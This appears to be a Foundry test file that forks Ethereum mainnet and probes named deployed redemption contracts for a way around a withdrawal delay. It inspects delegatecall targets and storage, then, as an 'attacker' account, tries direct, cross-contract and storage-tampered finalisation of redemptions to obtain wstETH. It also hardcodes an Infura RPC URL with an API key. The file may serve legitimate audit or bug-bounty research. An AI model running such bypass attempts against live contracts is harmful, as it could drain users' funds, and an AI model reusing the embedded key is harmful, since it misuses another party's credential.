// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * RC DELEGATECALL TARGETS
 *
 * RC has 4 DELEGATECALLs at offsets: 130, 141, 3021, 4718
 *
 * Early ones (130, 141) - likely proxy init pattern
 * Later ones (3021, 4718) - might be interesting targets
 *
 * If RC delegatecalls to a user-controllable address...
 */
contract RCDelegatecallTargets is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRCBytecodeAtDelegatecalls() public view {
        console.log("=== ANALYZE RC BYTECODE AT DELEGATECALLs ===\n");

        bytes memory code = RC.code;

        // Delegatecall offsets: 130, 141, 3021, 4718
        // Look at bytecode around each one

        uint[] memory offsets = new uint[](4);
        offsets[0] = 130;
        offsets[1] = 141;
        offsets[2] = 3021;
        offsets[3] = 4718;

        for (uint o = 0; o < offsets.length; o++) {
            uint offset = offsets[o];
            console.log("\n=== DELEGATECALL at offset %d ===", offset);

            // Show 30 bytes before and after
            uint startOffset = offset > 30 ? offset - 30 : 0;
            uint endOffset = offset + 30 < code.length ? offset + 30 : code.length;

            console.log("Bytecode around offset:");
            bytes memory snippet = new bytes(endOffset - startOffset);
            for (uint i = startOffset; i < endOffset; i++) {
                snippet[i - startOffset] = code[i];
            }
            console.logBytes(snippet);

            // Look for PUSH operations before delegatecall (target address)
            // PUSH20 = 0x73, PUSH1 = 0x60, etc.
            if (offset >= 21) {
                uint8 prevOp = uint8(code[offset - 21]);
                if (prevOp == 0x73) { // PUSH20 (address)
                    console.log("Found PUSH20 at offset:", offset - 21);
                    // Extract the address
                    bytes memory addrBytes = new bytes(20);
                    for (uint i = 0; i < 20; i++) {
                        addrBytes[i] = code[offset - 20 + i];
                    }
                    console.log("Hardcoded address:");
                    console.logBytes(addrBytes);
                }
            }
        }
    }

    function test_CheckDelegatecallTargetSlots() public {
        console.log("=== CHECK DELEGATECALL TARGET SLOTS ===\n");

        // Delegatecall targets are often loaded from storage
        // Check common slots

        console.log("R0 storage (used during delegatecall):");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(R0, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);

                // Check if it's an address with code
                address addr = address(uint160(uint256(slot)));
                if (addr.code.length > 0) {
                    console.log("  -> Has code, size:", addr.code.length);
                }
            }
        }

        // Check EIP-1967 slots
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 implValue = vm.load(R0, implSlot);
        console.log("\nEIP-1967 implementation:");
        console.logBytes32(implValue);

        if (uint256(implValue) != 0) {
            address impl = address(uint160(uint256(implValue)));
            console.log("Implementation:", impl);
            console.log("Implementation code size:", impl.code.length);

            // Check if implementation is RC
            if (impl == RC) {
                console.log("*** R0's implementation IS RC! ***");
            }
        }
    }

    function test_RedemptionStructLayout() public {
        console.log("=== REDEMPTION STRUCT LAYOUT ===\n");

        // Create a redemption and analyze the storage
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Redeem specific amounts to identify struct packing
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(123456789e18)));
        vm.stopPrank();

        // Read redemption storage
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayBaseSlot = keccak256(abi.encode(arrayLengthSlot));

        bytes32 data = vm.load(R0, arrayBaseSlot);
        console.log("Redemption data:");
        console.logBytes32(data);

        // Try to decode
        uint256 rawData = uint256(data);

        // Different packing hypotheses:
        // 1. {uint96 amount, uint64 timestamp} - common in Solidity
        // 2. {uint256 amount}, {uint256 timestamp} - separate slots
        // 3. {uint128 amount, uint64 timestamp, bool finalized, ...}

        console.log("\nDecoding attempts:");

        // Hypothesis 1: uint96 amount at bits 0-95, uint64 timestamp at bits 96-159
        uint96 h1Amount = uint96(rawData);
        uint64 h1Timestamp = uint64(rawData >> 96);
        console.log("H1 - amount:", uint256(h1Amount) / 1e18);
        console.log("H1 - timestamp:", uint256(h1Timestamp));

        // Hypothesis 2: uint64 timestamp at bits 0-63, uint96 amount at bits 64-159
        uint64 h2Timestamp = uint64(rawData);
        uint96 h2Amount = uint96(rawData >> 64);
        console.log("H2 - timestamp:", uint256(h2Timestamp));
        console.log("H2 - amount:", uint256(h2Amount) / 1e18);

        // Hypothesis 3: packed differently
        // Look at the actual hex
        console.log("\nRaw data as uint256:", rawData);
        console.log("Current timestamp:", block.timestamp);

        // Check second slot for more data
        bytes32 data1 = vm.load(R0, bytes32(uint256(arrayBaseSlot) + 1));
        console.log("\nSecond slot:");
        console.logBytes32(data1);
    }

    function test_FinalizeValidationLogic() public {
        console.log("=== FINALIZE VALIDATION LOGIC ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        vm.stopPrank();

        // Get redemption storage
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 arrayBaseSlot = keccak256(abi.encode(arrayLengthSlot));
        bytes32 originalData = vm.load(R0, arrayBaseSlot);

        console.log("Original redemption:");
        console.logBytes32(originalData);

        // Try different manipulations
        console.log("\n--- Testing manipulations ---");

        // Test 1: Zero out timestamp (keep amount)
        // The data format seems to be: amount at lower bits, timestamp at higher bits
        // Let's try: keep lower 96 bits, zero upper bits
        bytes32 zeroTimestamp = bytes32(uint256(originalData) & uint256(type(uint96).max));
        vm.store(R0, arrayBaseSlot, zeroTimestamp);
        console.log("Test 1 - Zero timestamp:");
        console.logBytes32(vm.load(R0, arrayBaseSlot));

        vm.startPrank(attacker);
        (bool s1,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        vm.stopPrank();
        console.log("Finalize success:", s1);

        // Restore original
        vm.store(R0, arrayBaseSlot, originalData);

        // Test 2: Set timestamp to very old value
        uint96 amount = uint96(uint256(originalData));
        uint64 oldTimestamp = 1; // Very old
        bytes32 oldTimeData = bytes32((uint256(oldTimestamp) << 96) | uint256(amount));
        vm.store(R0, arrayBaseSlot, oldTimeData);
        console.log("\nTest 2 - Old timestamp:");
        console.logBytes32(vm.load(R0, arrayBaseSlot));

        vm.startPrank(attacker);
        (bool s2,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        vm.stopPrank();
        console.log("Finalize success:", s2);

        // Restore original
        vm.store(R0, arrayBaseSlot, originalData);

        // Test 3: Maybe finalized flag is separate?
        bytes32 secondSlot = vm.load(R0, bytes32(uint256(arrayBaseSlot) + 1));
        console.log("\nSecond slot (might have finalized flag):");
        console.logBytes32(secondSlot);

        // Check array length
        bytes32 length = vm.load(R0, arrayLengthSlot);
        console.log("Array length:");
        console.logBytes32(length);
    }

    function test_BypassViaR1() public {
        console.log("=== BYPASS VIA R1 ===\n");

        // R1 is another redemption contract
        // What if R1 has a different delay or validation?

        address R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;

        console.log("R0 address:", R0);
        console.log("R1 address:", R1);

        // Compare storage
        bytes32 r0Slot4 = vm.load(R0, bytes32(uint256(4)));
        bytes32 r1Slot4 = vm.load(R1, bytes32(uint256(4)));

        uint256 r0Delay = (uint256(r0Slot4) >> 96) & type(uint32).max;
        uint256 r1Delay = (uint256(r1Slot4) >> 96) & type(uint32).max;

        console.log("R0 delay:", r0Delay / 86400, "days");
        console.log("R1 delay:", r1Delay / 86400, "days");

        // Check what asset R1 uses
        bytes32 r0Slot1 = vm.load(R0, bytes32(uint256(1)));
        bytes32 r1Slot1 = vm.load(R1, bytes32(uint256(1)));

        console.log("\nR0 slot 1:", address(uint160(uint256(r0Slot1))));
        console.log("R1 slot 1:", address(uint160(uint256(r1Slot1))));

        // Check vaults
        bytes32 r0Slot3 = vm.load(R0, bytes32(uint256(3)));
        bytes32 r1Slot3 = vm.load(R1, bytes32(uint256(3)));

        console.log("R0 slot 3:", address(uint160(uint256(r0Slot3))));
        console.log("R1 slot 3:", address(uint160(uint256(r1Slot3))));

        // Try redeeming through R1
        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R1, type(uint256).max);

        console.log("\nTrying R1.redeem...");
        (bool s1,) = R1.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("R1 redeem:", s1);

        if (s1) {
            (bool s2,) = R1.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
            console.log("R1 immediate finalize:", s2);
        }

        vm.stopPrank();
    }

    function test_CrossContractRedemption() public {
        console.log("=== CROSS-CONTRACT REDEMPTION ===\n");

        // Create redemption in R0, try to finalize via R1?

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create redemption in R0
        R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Try to finalize via R1
        console.log("Trying to finalize R0 redemption via R1...");
        address R1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
        (bool s1,) = R1.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
        console.log("R1 finalize of R0 redemption:", s1);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_DirectRCCallWithContext() public {
        console.log("=== DIRECT RC CALL WITH CONTEXT ===\n");

        // RC has delay=0 in its own storage
        // If we could somehow call RC directly but have it read from its own storage...

        // What if RC is called directly (not delegatecall)?
        // It would use RC's storage, which has delay=0!

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(RC, type(uint256).max);

        // Try direct call to RC
        console.log("Direct RC.redeem...");
        (bool s1,) = RC.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));
        console.log("Success:", s1);

        // If it worked, try immediate finalize
        if (s1) {
            (bool s2,) = RC.call(abi.encodeWithSignature("finalizeRedeem(uint256)", 0));
            console.log("Immediate finalize:", s2);
        }

        vm.stopPrank();

        // The issue is RC probably checks msg.sender or has auth checks
        // that fail when called directly

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }
}
